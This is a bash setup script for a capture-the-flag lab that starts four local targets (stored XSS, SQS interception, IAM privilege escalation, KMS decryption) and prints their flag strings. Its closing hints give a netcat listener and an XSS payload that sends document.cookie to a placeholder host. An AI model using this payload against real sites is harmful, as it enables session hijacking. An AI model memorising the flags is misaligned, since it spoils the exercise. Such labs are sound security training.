#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"

echo "[Chain-36] Stored XSS Session Hijack to Cloud Takeover — 4 steps, Web→Cloud×3"

# Step 1: Stored XSS (Docker)
echo "=== Step 1: WEB-18 Stored XSS ==="
docker compose -f "$ROOT/docker/web/xss-stored/docker-compose.yml" up -d --build 2>&1 | tail -2
echo "  [+] XSS web app at http://localhost:10118"
echo "  [*] Admin bot visits messages every 30s — set up cookie listener first"

# Step 2: SQS Intercept (LocalStack)
echo "=== Step 2: CLOUD-06 SQS Message Interception ==="
docker compose -f "$ROOT/docker/cloud/sqs-intercept/docker-compose.yml" up -d --build 2>&1 | tail -2
echo "  [+] LocalStack (SQS) at http://localhost:10606"

# Step 3: IAM Privilege Escalation (LocalStack)
echo "=== Step 3: CLOUD-02 IAM Privilege Escalation ==="
docker compose -f "$ROOT/docker/cloud/iam-privesc/docker-compose.yml" up -d --build 2>&1 | tail -2
echo "  [+] LocalStack (IAM) at http://localhost:10602"

# Step 4: KMS Decrypt (LocalStack)
echo "=== Step 4: CLOUD-08 KMS Decryption Oracle ==="
docker compose -f "$ROOT/docker/cloud/kms-oracle/docker-compose.yml" up -d --build 2>&1 | tail -2
echo "  [+] LocalStack (KMS) at http://localhost:10608"

echo ""
echo "[Chain-36] Ready"
echo "  Step 1: http://localhost:10118 → XSS cookie theft → flag{c36-step1-xss}"
echo "  Step 2: http://localhost:10606 → SQS intercept → flag{c36-step2-sqs}"
echo "  Step 3: http://localhost:10602 → IAM escalation → flag{c36-step3-iam}"
echo "  Step 4: http://localhost:10608 → KMS Decrypt → flag{c36-step4-kms}"
echo ""
echo "  [!] Step 1 requires setting up a cookie listener (e.g., nc -lvp 8888)"
echo "  [!] Craft XSS payload: <script>new Image().src='http://HOST_IP:8888/steal?c='+document.cookie</script>"
